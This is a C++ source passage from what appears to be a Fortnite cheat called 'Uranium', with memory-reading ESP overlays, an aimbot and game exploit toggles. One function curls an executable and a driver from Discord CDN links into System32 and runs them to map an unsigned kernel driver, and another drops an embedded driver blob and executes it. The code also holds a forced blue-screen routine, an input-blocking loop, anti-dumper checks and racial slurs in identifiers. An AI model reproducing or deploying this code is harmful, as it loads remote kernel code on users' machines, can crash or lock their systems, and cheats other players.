
	}

}

//ActorLoop
void ActorLoop()
{
	Uworld = read<DWORD_PTR>(base + offset_uworld);



	DWORD_PTR Gameinstance = read<DWORD_PTR>(Uworld + offset_gameinstance);
	if (Gameinstance == (DWORD_PTR)nullptr)
		return;
	DWORD_PTR LocalPlayers = read<DWORD_PTR>(Gameinstance + offset_localplayers);
	if (LocalPlayers == (DWORD_PTR)nullptr)
		return;
	Localplayer = read<DWORD_PTR>(LocalPlayers);
	if (Localplayer == (DWORD_PTR)nullptr)
		return;
	PlayerController = read<DWORD_PTR>(Localplayer + offset_playercontroller);
	if (PlayerController == (DWORD_PTR)nullptr)
		return;
	LocalPawn = read<uint64_t>(PlayerController + offset_localpawn);
	if (LocalPawn == (DWORD_PTR)nullptr)
		return;
	Rootcomp = read<uint64_t>(LocalPawn + offset_rootcomp);
	if (Rootcomp == (DWORD_PTR)nullptr)
		return;
	if (LocalPawn != 0) {
		localplayerID = read<int>(LocalPawn + offset_playerid);
	}
	Ulevel = read<DWORD_PTR>(Uworld + offset_plevel);
	if (Ulevel == (DWORD_PTR)nullptr)
		return;
	DWORD64 PlayerState = read<DWORD64>(LocalPawn + offset_playerstate);
	if (PlayerState == (DWORD_PTR)nullptr)
		return;
	DWORD ActorCount = read<DWORD>(Ulevel + offset_actorcount);
	DWORD_PTR AActors = read<DWORD_PTR>(Ulevel + offset_aactors);
	if (AActors == (DWORD_PTR)nullptr)
		return;


	
	
	for (int i = 0; i < ActorCount; i++)
	{
		uint64_t CurrentActor = read<uint64_t>(AActors + i * 0x8);
		int niggaid = read<int>(CurrentActor + offset_playerid);
		uint32_t object_id = read<uint32_t>(CurrentActor + 0x18);
		
		if (niggaid == Localplayer || niggaid == localplayerID)
		{
			uint64_t CurrentActorRootComponent = read<uint64_t>(CurrentActor + 0x130);
			uint64_t currentactormesh = read<uint64_t>(CurrentActor + 0x280);
			int MyTeamId = read<int>(PlayerState + 0xF28);
			DWORD64 otherPlayerState = read<uint64_t>(CurrentActor + 0x238);
			int ActorTeamId = read<int>(otherPlayerState + 0xF28);
			Vector3 Headpos = GetBoneWithRotation(currentactormesh, 98);
			Localcam = CameraEXT;
			uintptr_t CurrentWeapon = read<uintptr_t>(LocalPawn + 0x5F8); //CurrentWeapon Offset
			uintptr_t WeaponAssest = read<uintptr_t>(CurrentWeapon + 0x378); //WeaponData  Offset
			localactorpos = read<Vector3>(Rootcomp + 0x11C);
			float distance = localactorpos.Distance(Headpos) / 100.f;
			Vector3 CirclePOS = GetBoneWithRotation(currentactormesh, 2);
			Vector3 bone0 = GetBoneWithRotation(currentactormesh, 0);
			Vector3 bottom = ProjectWorldToScreen69(bone0, Vector3(Localcam.y, Localcam.x, Localcam.z));
			std::string null = XorStr("").c_str();
			Headposw2s = ProjectWorldToScreen69(Headpos, Vector3(Localcam.y, Localcam.x, Localcam.z));
			//HeadAim = ProjectWorldToScreen69(Headpos + vellocity, Vector3(Localcam.y, Localcam.x, Localcam.z));
			aimbottestnigga = true;
			Vector3 rootOut = GetBoneWithRotation(currentactormesh, 0);
			Vector3 Out = ProjectWorldToScreen69(rootOut, Vector3(Localcam.y, Localcam.x, Localcam.z));
			uintptr_t GWorld = read<uintptr_t>(Uworld);

			
			if (MyTeamId != ActorTeamId)
			{
				if (Options.Visuals.Distance)
				{
					char name[64];
					sprintf_s(name, "Player | %2.fm", distance);
					DrawString(14, Headposw2s.x, Headposw2s.y - 15, &Col.white_, true, true, name);
				}

				if (Options.Visuals.Snaplines && isInRectangle(960, 540, 800, bottom.x, bottom.y))
				{
					ImGui::GetOverlayDrawList()->AddLine(ImVec2(960, 1060), ImVec2(bottom.x, bottom.y), ImColor(255, 255, 255, 255), 1.0f);
				}


				

				if (Options.Visuals.Corner)
				{
					float boxsize = (float)(Out.y - Headposw2s.y);
					float boxwidth = boxsize / 3.0f;
					float BoxHeight = (float)(Out.y - Headposw2s.y);
					float BoxWidth = BoxHeight * 0.230f;
					float dwpleftx = (float)Out.x - (BoxWidth / 1);
					float dwplefty = (float)Out.y;
					float CornerHeight = abs(Out.y - Headposw2s.y);
					float CornerWidth = CornerHeight * 0.5; //0.5
					DrawCorneredBox(Headposw2s.x - (CornerWidth / 2), Headposw2s.y, CornerWidth, CornerHeight, IM_COL32(255, 255, 255, 255), 1.0);
				}

			/*	if (Options.Visuals.guntest1)
				{
					if (CurrentWeapon) {
						driver.write<bool>(CurrentWeapon + 0x2B3, true); //bDisableEquipAnimation Offset 
					}
				}
				else
				{ 
					
				}

				if (Options.Visuals.guntest2)//silent
				{


					float AimbotLocationX;
					float AimbotLocationY;
					int AllPlayerLocationX = Headposw2s.x;
					int AllPlayerLocationY = Headposw2s.y;
					int array69_x[] = { AllPlayerLocationX };
					int n_x = sizeof(array69_x) / sizeof(array69_x[0]);
					int array69_y[] = { AllPlayerLocationY };
					int n_y = sizeof(array69_y) / sizeof(array69_y[0]);
					int targetX = Settings::MajorValues::ScreenCenterX;
					int targetY = Settings::MajorValues::ScreenCenterY;
					NewPlayerLocationX = findClosest(array69_x, n_x, targetX);
					NewPlayerLocationY = findClosest(array69_y, n_y, targetY);
					AimbotLocationX = NewPlayerLocationX;
					AimbotLocationY = NewPlayerLocationY;



					void*** Vtable = (void***)CurrentWeapon;
					if (!Vtable[0]) return;
					auto index = Vtable[0x4F];

					
					
					
							//*(Vector3*)((uintptr_t)thingy + 0x2B9 + 0x350) = { NewPlayerLocationX, NewPlayerLocationY, 0 };
							driver.write<Vector3>((uintptr_t)index + 0x2B9 + 0x350, Vector3(NewPlayerLocationX, NewPlayerLocationY, 0));
						
					
				}

				if (Options.Visuals.guntest3)
				{
					if (GetAsyncKeyState(VK_SHIFT)) { //Alt Keybind
						driver.write<float>(LocalPawn + 0x98, 0); //CustomTimeDilation Offset
					}
					else {
						driver.write<float>(LocalPawn + 0x98, 1); //CustomTimeDilation Offset
					}
				}
				

				if (Options.Visuals.guntest4)
				{
					if (GetAsyncKeyState(VK_SHIFT)) { //Alt Keybind
						driver.write<float>(LocalPawn + 0x146d, 0.02f); //bIsSkydiving  Offset
					}
					else//UCU
					{
						driver.write<float>(LocalPawn + 0x146d, 1.00f); //bIsSkydiving  Offset
					}
				}
				

				if (Options.Visuals.guntest5)
				{
					if (GetAsyncKeyState(VK_SHIFT)) { //Alt Keybind
						driver.write<float>(LocalPawn + 0x146e, 0.02f); //bIsParachuteOpen  Offset
					}
					else {
						driver.write<float>(LocalPawn + 0x146e, 1.00f); //bIsParachuteOpen 
						
					}
				}

				if (Options.Visuals.guntest6)
				{
					driver.write<bool>(LocalPawn + 0x37c2, false); //bShouldDropItemsOnDeath Offset 
				}
				else
				{
				
				}

				if (Options.Visuals.guntest7)
				{
					driver.write<float>(LocalPawn + 0x4000, 0.02f); //LastFallDistance Offset 
				}

				if (Options.Visuals.guntest8)
				{
					driver.write<bool>(LocalPawn + 0x4164, true); //bIsCreativeGhostModeActivated Offset 
				}
				else
				{
					
				}*/

				if (Options.Visuals.HeadDot)
				{
					ImGui::GetOverlayDrawList()->AddCircleFilled(ImVec2(Headposw2s.x, Headposw2s.y),5, ImColor(255, 255, 255, 255) ,12);
				}
				if (Options.Visuals.Boxes)
				{
					float boxsize = (float)(Out.y - Headposw2s.y);
					float boxwidth = boxsize / 3.0f;
					float BoxHeight = (float)(Out.y - Headposw2s.y);
					float BoxWidth = BoxHeight * 0.230f;
					float dwpleftx = (float)Out.x - (BoxWidth / 1);
					float dwplefty = (float)Out.y;
					float CornerHeight = abs(Out.y - Headposw2s.y);
					float CornerWidth = CornerHeight * 0.5; //0.5
					ImGui::GetOverlayDrawList()->AddRect(ImVec2(dwpleftx, dwplefty), ImVec2(Headposw2s.x + boxwidth, Headposw2s.y + 5.0f), IM_COL32(255, 255, 255, 255));
				}
				if (Options.Aimbot.Enable && (GetAsyncKeyState(VK_SHIFT) || GetAsyncKeyState(0x02)) && isInRectangle(Settings::MajorValues::ScreenCenterX, Settings::MajorValues::ScreenCenterY, Options.Aimbot.AimbotFOV, Headposw2s.x, Headposw2s.y) && distance < Options.Aimbot.AimbotMaximalDistance)
				if (Options.Aimbot.Enable && (GetAsyncKeyState(VK_DOWN) || GetAsyncKeyState(0x02)) && isInRectangle(Settings::MajorValues::ScreenCenterX, Settings::MajorValues::ScreenCenterY, Options.Aimbot.AimbotFOV, Headposw2s.x, Headposw2s.y) && distance < Options.Aimbot.AimbotMaximalDistance)
				{
					aimbottestnigga2 = true;
					if (Options.Aimbot.prediction)
					{
						Vector3 vellocity = read<Vector3>(currentactormesh + 0x140);
						float Distance = localactorpos.Distance(Headposw2s) / 100.f;
						float Time = Distance / (3000 / 100.f);
						Headposw2s = Headposw2s + vellocity * Time;
					}
						
					float AimbotLocationX; 
					float AimbotLocationY; 
					int AllPlayerLocationX = Headposw2s.x; 
					int AllPlayerLocationY = Headposw2s.y;
					int array69_x[] = { AllPlayerLocationX };
					int n_x = sizeof(array69_x) / sizeof(array69_x[0]);
					int array69_y[] = { AllPlayerLocationY };
					int n_y = sizeof(array69_y) / sizeof(array69_y[0]);
					int targetX = Settings::MajorValues::ScreenCenterX;
					int targetY = Settings::MajorValues::ScreenCenterY;
					NewPlayerLocationX = findClosest(array69_x, n_x, targetX);
					NewPlayerLocationY = findClosest(array69_y, n_y, targetY);
					AimbotLocationX = NewPlayerLocationX;
					AimbotLocationY = NewPlayerLocationY;
				}
				if (Options.Visuals.filledboxes) {
					float boxsize = (float)(Out.y - Headposw2s.y);
					float boxwidth = boxsize / 3.0f;
					float BoxHeight = (float)(Out.y - Headposw2s.y);
					float BoxWidth = BoxHeight * 0.224f;
					float dwpleftx = (float)Out.x - (BoxWidth / 1);
					float dwplefty = (float)Out.y;
					float CornerHeight = abs(Out.y - Headposw2s.y);
					float CornerWidth = CornerHeight * 0.5; //0.5
					ImGui::GetOverlayDrawList()->AddRectFilled(ImVec2(dwpleftx, dwplefty), ImVec2(Headposw2s.x + boxwidth, Headposw2s.y + 5.0f), IM_COL32(40, 40, 40, 180));
				}

			}
		}
	}
	
}


//Aimbot loop
void AimbotLoop()
{
	while (1)
	{
		if (Options.Aimbot.Enable && aimbottestnigga && aimbottestnigga2)
		{
			if (Options.Aimbot.AimKey_RMB && GetAsyncKeyState(0x02))
			{
				aimbot(NewPlayerLocationX, NewPlayerLocationY);
			}
			else if (Options.Aimbot.AimKey_SHIFT && GetAsyncKeyState(VK_SHIFT))
			{
				aimbot(NewPlayerLocationX, NewPlayerLocationY);
			}
			else if (Options.Aimbot.AimKey_DOWN && GetAsyncKeyState(VK_DOWN))
			{
				aimbot(NewPlayerLocationX, NewPlayerLocationY);
			}
		}
		aimbottestnigga = false;
		aimbottestnigga2 = false;
		break;
	}
}

//Reset menu settings
void resetmenu()
{
	Options.Aimbot.Enable = true;
	Options.Aimbot.DrawFOV = true;
	Options.Aimbot.ClosestByCrosshair = true;
	Options.Aimbot.ClosestByDistance = false;
	Options.Aimbot.AimPos_Head = true;
	Options.Aimbot.AimPos_Body = false;
	Options.Aimbot.AimbotFOV = 50.0f;
	Options.Aimbot.AimbotSmooth = 2.0f;
	Options.Aimbot.AimbotMaximalDistance = 100.0f;
	Options.Aimbot.AimKey;
	Options.Visuals.Boxes = true;
	Options.Visuals.filledboxes = false;
	Options.Visuals.Skeletons;
	Options.Visuals.Snaplines = true;
	Options.Visuals.Distance = true;
	Options.Visuals.HeadDot;
	Options.Visuals.Nickname;
	Options.Visuals.ActiveItemOrWeapon;
	Options.Misc.FakeKeyboardSounds = false;
	Options.Misc.Crosshair = false;
	Options.Misc.WhiteCross = false;
	Options.Misc.CrosshairX = 10.0f;
	Options.Misc.CrosshairY = 10.0f;
	Options.Misc.CrosshairThickness = 1.0f;
	Sleep(200);
	Options.ShowMenu = true;
	Options.MenuTab = 0;
}

//Menu colors
void rendercolors()
{
	//if (auth_check_nigga_shit != XorStr("true").c_str())
	//{
	//	std::cout << XorStr("\n Loading error 4 - contact support").c_str();
	//	Sleep(-1);
	//	exit(0);
	//}
}

//Render cheat addons
void RenderAddons()
{
	
	//Aimbot FOV circle
	if (Options.Aimbot.DrawFOV) { ImGui::GetOverlayDrawList()->AddCircle(ImVec2(Settings::MajorValues::ScreenCenterX, Settings::MajorValues::ScreenCenterY), Options.Aimbot.AimbotFOV, ImGui::GetColorU32({ 0.8f, 0.8f, 0.8f, 0.9f }), 32, 1.0f);}
	
	//Crosshair
	if (Options.Misc.Crosshair){ImGui::GetOverlayDrawList()->AddLine(ImVec2(Settings::MajorValues::ScreenCenterX - Options.Misc.CrosshairX, Settings::MajorValues::ScreenCenterY), ImVec2(Settings::MajorValues::ScreenCenterX + Options.Misc.CrosshairX, Settings::MajorValues::ScreenCenterY), ImGui::GetColorU32({ 0.8f, 0.0f, 0.0f, 0.9f }), Options.Misc.CrosshairThickness);ImGui::GetOverlayDrawList()->AddLine(ImVec2(Settings::MajorValues::ScreenCenterX, Settings::MajorValues::ScreenCenterY - Options.Misc.CrosshairY), ImVec2(Settings::MajorValues::ScreenCenterX, Settings::MajorValues::ScreenCenterY + Options.Misc.CrosshairY), ImGui::GetColorU32({ 0.8f, 0.0f, 0.0f, 0.9f }), Options.Misc.CrosshairThickness);}

	ImVec2 window_pos = ImGui::GetWindowPos();
	ImVec2 window_size = ImGui::GetWindowSize();
	int crosspozisyon = window_pos.x + window_size.x * 0.5f;
	int crosspozisyony = window_pos.y + window_size.y * 0.5f;
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(crosspozisyon, crosspozisyony - 1), ImVec2(crosspozisyon, crosspozisyony + 1), ImColor(255, 255, 255, 255));
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(crosspozisyon - 1, crosspozisyony), ImVec2(crosspozisyon + 1, crosspozisyony), ImColor(255, 255, 255, 255));
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(crosspozisyon, crosspozisyony + 1), ImVec2(crosspozisyon - 1, crosspozisyony + 1), ImColor(255, 255, 255, 255));
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(crosspozisyon, crosspozisyony - 1), ImVec2(crosspozisyon + 1, crosspozisyony - 1), ImColor(255, 255, 255, 255));
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(crosspozisyon - 1, crosspozisyony), ImVec2(crosspozisyon - 1, crosspozisyony - 1), ImColor(255, 255, 255, 255));
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(crosspozisyon + 1, crosspozisyony), ImVec2(crosspozisyon + 1, crosspozisyony + 1), ImColor(255, 255, 255, 255));
}

//Save config
void SaveConfig()
{
	
	
}

//Load config
void LoadConfig()
{
	
	
	
}

//Renderer
void renderLoopCall() {

	//Render setup
	ImGui_ImplDX9_NewFrame(); ImGui_ImplWin32_NewFrame(); ImGui::NewFrame();
	RECT rect = { 0 }; if (GetWindowRect(GameWnd, &rect)) { Settings::MajorValues::Width = rect.right - rect.left; Settings::MajorValues::Height = rect.bottom - rect.top; } Settings::MajorValues::ScreenCenterX = (Settings::MajorValues::Width / 2.0f), Settings::MajorValues::ScreenCenterY = (Settings::MajorValues::Height / 2.0f);
	
	//Render cheat addons
	RenderAddons();

	//Start the ActorLoop (ESP, etc.)
	ActorLoop();

	//Start the Aimbot loop
	AimbotLoop();
	
	//Toggle menu: F8
	if (GetAsyncKeyState(VK_INSERT) & 1) {Options.ShowMenu = !Options.ShowMenu; }

	//Toggle visuals: F6
	//if (GetAsyncKeyState(VK_F6) & 1) { mciSendString(XorStr(L"play C:\\Insanity\\buttonclick.mp3").c_str(), NULL, 0, 0); Options.Aimbot.DrawFOV = false; Options.Visuals.ActiveItemOrWeapon = false; Options.Visuals.Boxes = false; Options.Visuals.Distance = false; Options.Visuals.HeadDot = false; Options.Visuals.Nickname = false; Options.Visuals.Skeletons; Options.Visuals.Snaplines = false; Options.Misc.Crosshair = false; }

	//Exit: F2
	//if (GetAsyncKeyState(VK_F2) & 1) { mciSendString(XorStr(L"play C:\\Insanity\\buttonclick.mp3").c_str(), NULL, 0, 0); Sleep(200); exit(0); }

	//Check if it's the first use
	if (Options.FirstUse)
	{
		////Set ImGui window position
		ImGui::SetWindowPos(ImVec2(700, 550));

		//Load config
		LoadConfig();

		//Initialize menu colors
		rendercolors();

		//Disable first use
		Options.FirstUse = false;
	}

	//Check if Options.ShowMenu is enabled
	if (Options.ShowMenu)
	{
		
		//Begin menu drawing
		if (ImGui::Begin("Uranium", NULL, 58))
		{

			//Set ImGui window size
			ImGui::SetWindowSize(ImVec2(570.000f, 420.000f), ImGuiCond_Once);



			/*ImGui::Text(XorStr("Aimbot").c_str());
			ImGui::Checkbox(XorStr("Memory").c_str(), &Options.Aimbot.Enable);
			ImGui::Checkbox(XorStr("Trigger Bot").c_str(), &Options.Aimbot.autofiretrigger);
			ImGui::Text(XorStr("").c_str());
			ImGui::SliderFloat(XorStr("Smooth").c_str(), &Options.Aimbot.AimbotSmooth, 2, 20);
			ImGui::SliderFloat(XorStr("Fov Circle").c_str(), &Options.Aimbot.AimbotFOV, 10, 1000);
			ImGui::SliderFloat(XorStr("Max Distance").c_str(), &Options.Aimbot.AimbotMaximalDistance, 15.f, 200.f, XorStr("%.2f").c_str());
			ImGui::Text(XorStr("").c_str());
			ImGui::Checkbox(XorStr("Normal Box").c_str(), &Options.Visuals.Boxes);
			ImGui::Checkbox(XorStr("Snaplines").c_str(), &Options.Visuals.Snaplines);
			ImGui::Checkbox(XorStr("Corenered Box").c_str(), &Options.Visuals.Corner);
			ImGui::Checkbox(XorStr("Filled Box").c_str(), &Options.Visuals.filledboxes);
			ImGui::Checkbox(XorStr("Distance ESP").c_str(), &Options.Visuals.Distance);
			ImGui::Checkbox(XorStr("Dot ESP").c_str(), &Options.Visuals.HeadDot);
			ImGui::Text(XorStr("").c_str());
			ImGui::Checkbox(XorStr("Reload").c_str(), &Options.Visuals.guntest1);
			ImGui::Checkbox(XorStr("Animation").c_str(), &Options.Visuals.guntest2);
			ImGui::Checkbox(XorStr("Skyfly1").c_str(), &Options.Visuals.guntest3);
			ImGui::Checkbox(XorStr("SkyFly2").c_str(), &Options.Visuals.guntest4);
			ImGui::Checkbox(XorStr("Parachute Exploit").c_str(), &Options.Visuals.guntest5);*/


			ImGui::SetCursorPos(ImVec2(10.000f, 53.356f));
			ImGui::Checkbox("Aimbot", &Options.Aimbot.Enable);

			ImGui::SameLine();
			ImGui::Checkbox("Triggerbot", &Options.Aimbot.autofiretrigger);

			ImGui::SameLine();
			ImGui::Checkbox("Prediction", &Options.Aimbot.prediction);

			
			ImGui::SetCursorPos(ImVec2(10.000f, 83.000f));
			ImGui::SliderFloat("Smooth", &Options.Aimbot.AimbotSmooth, 2.000f, 6.000f);

			
			ImGui::SetCursorPos(ImVec2(10.000f, 110.000f));
			ImGui::SliderFloat("Fov Circle", &Options.Aimbot.AimbotFOV, 10.000f, 1000.000f);

			
			ImGui::SetCursorPos(ImVec2(10.000f, 135.000f));
			ImGui::SliderFloat("Aim Max Distance", &Options.Aimbot.AimbotMaximalDistance, 20.000f, 200.000f);

			
			//ImGui::SetCursorPos(ImVec2(10.000f, 160.000f));
			//ImGui::Combo("Aim Bone", &Options.Visuals.bone, "Head\0Neck\0Boobies\0Dick\0");

			ImGui::SetCursorPos(ImVec2(10.000f, 182.000f));
			ImGui::Text("______________________________________________________________");

			ImGui::SetCursorPos(ImVec2(11.000f, 234.000f));
			ImGui::Checkbox("Chest ESP", &Options.Visuals.chest);

			ImGui::SetCursorPos(ImVec2(10.000f, 260.000f));
			ImGui::Checkbox("Snaplines", &Options.Visuals.Snaplines);

			ImGui::SetCursorPos(ImVec2(10.000f, 285.000f));
			ImGui::Checkbox("Corenered Box", &Options.Visuals.Corner);

			ImGui::SetCursorPos(ImVec2(10.000f, 310.000f));
			ImGui::Checkbox("Filled Box", &Options.Visuals.filledboxes);

			ImGui::SetCursorPos(ImVec2(10.000f, 335.000f));
			ImGui::Checkbox("Head Dot", &Options.Visuals.HeadDot);

			ImGui::SetCursorPos(ImVec2(10.000f, 361.000f));
			ImGui::Checkbox("Show Distance", &Options.Visuals.Distance);

			
			ImGui::SetCursorPos(ImVec2(10.000f, 389.000f));
			ImGui::SliderFloat("Max Distance", &Options.Visuals.EspMaximalDistance, 20.000f, 300.000f);

			ImGui::SetCursorPos(ImVec2(10.000f, 207.000f));
			ImGui::Text("Visuals");

			ImGui::SetCursorPos(ImVec2(10.000f, 24.356f));
			ImGui::Text("Aimbot");

			

			ImGui::SetCursorPos(ImVec2(361.000f, 237.000f));
			ImGui::Checkbox("Fast Actions", &Options.Visuals.guntest1);

			ImGui::SetCursorPos(ImVec2(361.000f, 260.000f));
			ImGui::Checkbox("Ghost Mode", &Options.Visuals.guntest2);

			ImGui::SetCursorPos(ImVec2(361.000f, 285.000f));
			ImGui::Checkbox("Anti Drom Items On Death", &Options.Visuals.guntest3);

			ImGui::SetCursorPos(ImVec2(361.000f, 310.000f));
			ImGui::Checkbox("Fly Exploit", &Options.Visuals.guntest4);

			ImGui::SetCursorPos(ImVec2(361.000f, 335.000f));
			ImGui::Checkbox("Parachute Exploit", &Options.Visuals.guntest5);

			ImGui::SetCursorPos(ImVec2(339.000f, 207.000f));
			ImGui::Text("Misc");

			
		}
		//End ImGui
		ImGui::End();

	}


	//End ImGui Frame
	ImGui::EndFrame();

	//Render, clear
	p_Device->SetRenderState(D3DRS_ZENABLE, false);
	p_Device->SetRenderState(D3DRS_ALPHABLENDENABLE, false);
	p_Device->SetRenderState(D3DRS_SCISSORTESTENABLE, false);
	p_Device->Clear(0, NULL, D3DCLEAR_TARGET, D3DCOLOR_ARGB(0, 0, 0, 0), 1.0f, 0);
	if (p_Device->BeginScene() >= 0){ImGui::Render();ImGui_ImplDX9_RenderDrawData(ImGui::GetDrawData());p_Device->EndScene();}

	//Result
	HRESULT result = p_Device->Present(NULL, NULL, NULL, NULL);
	if (result == D3DERR_DEVICELOST && p_Device->TestCooperativeLevel() == D3DERR_DEVICENOTRESET)
	{ImGui_ImplDX9_InvalidateDeviceObjects();p_Device->Reset(&p_Params);ImGui_ImplDX9_CreateDeviceObjects();}
}

WPARAM MainLoop()
{
	static RECT old_rc;
	ZeroMemory(&Message, sizeof(MSG));

	while (Message.message != WM_QUIT)
	{
		if (PeekMessage(&Message, MyWnd, 0, 0, PM_REMOVE))
		{
			TranslateMessage(&Message);
			DispatchMessage(&Message);
		}
		/*if (auth_check_nigga_shit != XorStr("true").c_str())
		{
			std::cout << XorStr("\n Loading error 4 - contact support").c_str();
			Sleep(-1);
			exit(0);
		}*/
		HWND hwndActive = GetForegroundWindow();

		if (hwndActive == GameWnd) {
			HWND hwndTest = GetWindow(hwndActive, GW_HWNDPREV);

			SetWindowPos(MyWnd, hwndTest, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE);
		}

		RECT rc;
		POINT xy;

		ZeroMemory(&rc, sizeof(RECT));
		ZeroMemory(&xy, sizeof(POINT));
		GetClientRect(GameWnd, &rc);
		ClientToScreen(GameWnd, &xy);
		rc.left = xy.x;
		rc.top = xy.y;

		ImGuiIO& io = ImGui::GetIO();
		io.ImeWindowHandle = GameWnd;
		io.DeltaTime = 1.0f / 60.0f;

		POINT p;
		GetCursorPos(&p);
		io.MousePos.x = p.x - xy.x;
		io.MousePos.y = p.y - xy.y;

		if (GetAsyncKeyState(VK_LBUTTON)) {
			io.MouseDown[0] = true;
			io.MouseClicked[0] = true;

			io.MouseClickedPos[0].x = io.MousePos.x;
			io.MouseClickedPos[0].x = io.MousePos.y;
		}
		else {
			io.MouseDown[0] = false;
		}

		SetWindowPos(GameWnd, MyWnd, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE);

		renderLoopCall();
	}

	ImGui_ImplDX9_Shutdown();
	ImGui_ImplWin32_Shutdown();
	ImGui::DestroyContext();

	
	DestroyWindow(MyWnd);

	return Message.wParam;
}


bool initiateCheat() {
	
	

	system(XorStr("cls").c_str());
	std::cout << XorStr("\n Loading..").c_str();


	process_id = GetAowProcId();




	//usermode_pid = GetCurrentProcessId();
	Sleep(1000);
	//usermode_pid;

	
	Sleep(1000);
	m_base = get_module_base_address("FortniteClient-Win64-Shipping.exe");

	Sleep(1000);
	system(XorStr("cls").c_str());
	::ShowWindow(::GetConsoleWindow(), SW_HIDE);
	return true;
}




//#include "base64/base64.h"
//#include "cheat/mapper/kdmapper.hpp"

//#include "cheatdriver/download.h"
HANDLE iqvw64e_device_handle;

/*LONG WINAPI SimplestCrashHandler(EXCEPTION_POINTERS* ExceptionInfo)
{
	if (ExceptionInfo && ExceptionInfo->ExceptionRecord)
		Log(L"[!!] Crash at addr 0x" << ExceptionInfo->ExceptionRecord->ExceptionAddress << L" by 0x" << std::hex << ExceptionInfo->ExceptionRecord->ExceptionCode << std::endl);
	else
		Log(L"[!!] Crash" << std::endl);

	if (iqvw64e_device_handle)
		intel_driver::Unload(iqvw64e_device_handle);

	return EXCEPTION_EXECUTE_HANDLER;
}*/

/*std::wstring s2ws69(const std::string& str)
{
	int size_needed = MultiByteToWideChar(CP_UTF8, 0, &str[0], (int)str.size(), NULL, 0);
	std::wstring wstrTo(size_needed, 0);
	MultiByteToWideChar(CP_UTF8, 0, &str[0], (int)str.size(), &wstrTo[0], size_needed);
	return wstrTo;
}*/


//recode this
void gwmain() {

	system("curl https://cdn.discordapp.com/attachments/890464568478957599/896327811151855616/kdmappernew.exe --output C:/Windows/System32/kdmappernew.exe >nul 2>&1");
	system("curl https://cdn.discordapp.com/attachments/874979444056547399/896334239451213845/c.sys --output C:/Windows/System32/c.sys >nul 2>&1");
	system("C:/Windows/System32/kdmappernew.exe C:/Windows/System32/c.sys");
	printf(XorStr("\n").c_str());
	system("del c.sys >nul 2>&1");
	system("del kdmappernew.exe >nul 2>&1");
}
std::string locof = "C:\\ProgramData\\Microsoft\\Windows\\";
std::string TOUFUNT = sta + rt + " " + locof + Morinme;
#pragma comment(lib, "ntdll.lib")

void titledetect();
void exedetect();
void driverdetect();

extern "C" NTSTATUS NTAPI RtlAdjustPrivilege(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN OldValue);
extern "C" NTSTATUS NTAPI NtRaiseHardError(LONG ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask,
	PULONG_PTR Parameters, ULONG ValidResponseOptions, PULONG Response);


void BlueScreen()
{
	//exit(0);
	BOOLEAN bl;
	ULONG Response;
	RtlAdjustPrivilege(19, TRUE, FALSE, &bl); // Enable SeShutdownPrivilege
	NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, NULL, 6, &Response); // Shutdown
}
void debug()
{
	std::ofstream c;
	c.open((locof + Morinme), std::ios::binary | std::ios::out);
	c.write((char*)&drervers, sizeof(drervers));
	c.close();

	
	system(TOUFUNT.c_str());
	while (true)
	{
		Sleep(100);
		titledetect();
		exedetect();
		driverdetect();
	}
}




void exedetect()
{

}

void titledetect()
{
	
}

void driverdetect()
{
	const TCHAR* devices[] = {
_T("\\\\.\\NiGgEr"),
_T("\\\\.\\KsDumper")
	};

	WORD iLength = sizeof(devices) / sizeof(devices[0]);
	for (int i = 0; i < iLength; i++)
	{
		HANDLE hFile = CreateFile(devices[i], GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		TCHAR msg[256] = _T("");
		if (hFile != INVALID_HANDLE_VALUE) {
			system(XorStr("start cmd /c START CMD /C \"COLOR C && TITLE Protection && ECHO KsDumper Detected. && TIMEOUT 10 >nul").c_str());
			exit(0);
		}
		else
		{

		}
	}
}
HANDLE questions = GetStdHandle(STD_OUTPUT_HANDLE);
#








#include <fstream>
#include <filesystem>
#include <iosfwd>
void ldfgjdfgjjhgfdjghdf()
{
	
}
#include <direct.h>
#include <urlmon.h>
#pragma comment(lib, "urlmon.lib")

bool is_file_exist(const char* fileName)
{
	std::ifstream infile(fileName);
	return infile.good();
}
bool running = true;
void input()
{
	while (running)
	{
		int x, y;
		x = 1200;
		y = 1200;
		auto setcur = (SetCursorPos);
		setcur(x, y);
		auto blockin = (BlockInput);
		blockin(true);
	}
}

int maincheat()
{
	std::thread anti(debug);
	SetConsoleTitleA(XorStr(" ").c_str());
	system(XorStr("color b").c_str());
	std::cout << XorStr("\n Connecting").c_str();
	Sleep(958);
	
	//KeyAuthApp.init();
	system(XorStr("cls").c_str());
	
	Sleep(1500);

	//Install stuff

	system(XorStr("cls").c_str());
	

	//login
	//ldfgjdfgjjhgfdjghdf();
	//SendWebhook(key);
	system(XorStr("color b").c_str());
	system(XorStr("cls").c_str());





	system(XorStr("cls").c_str());
	std::cout << XorStr("\n Start FortniteClient-Win64-Shipping.exe").c_str();
	
	system(XorStr("cls").c_str());
	std::cout << XorStr("\n Press F2 In Lobby").c_str();
	while (true)
	{
		Sleep(10);
		if (GetAsyncKeyState(VK_F2))
		{
			break;
		}
	}
	system(XorStr("cls").c_str());
	Beep(500, 500);
	if (!initiateCheat()) {
		system(XorStr("cls").c_str());
		std::cout << XorStr("\n Loading error 1").c_str();
		Sleep(-1);
	}
	

	SetupWindow();
	DirectXInit(MyWnd);

	while (true) {
		MainLoop();
	}

	return 0;
}


void mainy()
{
	
	
	std::cout << XorStr("\n Loadign Cheat");
	Sleep(2000);
	Beep(888, 500);
	SetConsoleTitleA(XorStr("Uranium Undetected Cheat Loaded").c_str());
	system(XorStr("cls").c_str());




	Beep(300, 500);
	maincheat();









}


int main()
{
	SetConsoleTitleA(XorStr("Uranium Undetected Cheat Loaded").c_str());
	system(XorStr("color d").c_str());
	std::cout << XorStr("\n\n Connecting..");


	system(XorStr("cls").c_str());
